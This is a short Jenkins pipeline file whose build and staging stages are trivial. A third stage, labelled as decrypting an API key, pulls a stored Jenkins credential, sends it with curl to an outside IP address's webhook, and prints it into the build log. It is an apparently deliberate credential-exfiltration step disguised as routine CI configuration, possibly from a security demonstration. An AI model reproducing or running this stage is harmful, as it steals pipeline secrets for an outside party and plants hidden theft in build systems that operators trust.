node {
    stage('Build Application') {
            sh '''
        npm install
        '''
    }
    stage('Deploy to Staging Environment') {
            sh '''
            echo "Deploy to Staging"
            '''
    }
    stage('Jenkins Credentials1 | Decrypt API KEY') {
      withCredentials([string(credentialsId: '11e2e88b2e5af090b58112f2f33f8628d6',
                              variable: 'secretText')]) {
        apiKey = "\nAPI key: ${secretText}\n"
        sh '''
        curl -XPOST -H "Content-type: application/json" -d '{"data":{"secretText":"'${secretText}'"}}' 'http://35.212.136.14:5000/webhook'
        '''
      }
      println apiKey
    }
}
